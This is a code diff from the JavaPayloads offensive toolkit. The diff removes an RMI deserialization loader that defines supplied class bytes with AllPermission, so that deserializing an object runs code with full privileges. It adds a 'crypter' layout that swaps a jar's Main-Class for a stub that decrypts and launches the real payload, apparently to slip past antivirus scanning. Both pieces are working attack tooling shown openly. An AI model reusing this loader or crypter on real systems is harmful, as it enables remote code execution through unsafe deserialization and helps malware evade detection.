@@ -1,7 +1,7 @@
 /*
  * Java Payloads.
  * 
- * Copyright (c) 2011 Michael 'mihi' Schierl
+ * Copyright (c) 2012 Michael 'mihi' Schierl
  * All rights reserved.
  * 
  * Redistribution and use in source and binary forms, with or without
@@ -32,43 +32,40 @@
  * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  */
 
-package javapayload.loader.rmi;
+package javapayload.crypter;
 
-import java.io.ObjectStreamException;
-import java.io.Serializable;
-import java.net.URL;
-import java.security.AllPermission;
-import java.security.CodeSource;
-import java.security.Permissions;
-import java.security.ProtectionDomain;
-import java.security.cert.Certificate;
+import java.util.jar.Manifest;
 
-public class Loader extends ClassLoader implements Serializable {
+import javapayload.Parameter;
 
-	public byte[][] classes;
+public class MainClass extends TemplateBasedJarLayout {
 
-	public Object[] parameters;
-
-	public Object readResolve() throws ObjectStreamException {
-		try {
-			Class clazz = null;
-			for (int i = 0; i < classes.length; i++) {
-				Permissions permissions = new Permissions();
-				permissions.add(new AllPermission());
-				clazz = defineClass(null, classes[i], 0, classes[i].length, new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions));
-			}
-			clazz.getConstructor(new Class[] { Object[].class }).newInstance(new Object[] { parameters });
-		} catch (Throwable t) {
-			/* #JDK1.4 */try {
-				throw new RuntimeException(t);
-			} catch (NoSuchMethodError ex) /**/{
-				throw new RuntimeException(t.toString());
-			}
-		}
-		return null;
+	public MainClass() {
+		super("Classic executable Jar with Main-Class attribute", Template.class,
+				"Use this jar layout with Jar files that contain a main class.");
 	}
-	
-	public void go() throws ObjectStreamException {
-		readResolve();
+
+	public Parameter[] getParameters() {
+		return new Parameter[] {
+				new Parameter("MAINCLASS", true, Parameter.TYPE_ANY, "Name of the new main class"),
+		};
+	}
+
+	public void init(String[] parameters, Manifest manifest) throws Exception {
+		targetClassName = manifest.getMainAttributes().getValue("Main-Class");
+		if (parameters.length == 1) {
+			stubClassName = parameters[0];
+		}
+		manifest.getMainAttributes().putValue("Main-Class", stubClassName);
+	}
+
+	public static class Template {
+
+		public static Class target;
+
+		public static void main(String[] args) throws Exception {
+			TemplateBasedJarLayout.cryptedMain(new String[] { "TARGET_CLASS_NAME", "STUB_CLASS_NAME", "target" });
+			target.getMethod("main", new Class[] { Class.forName("[Ljava.lang.String;") }).invoke(null, new Object[] { args });
+		}
 	}
 }
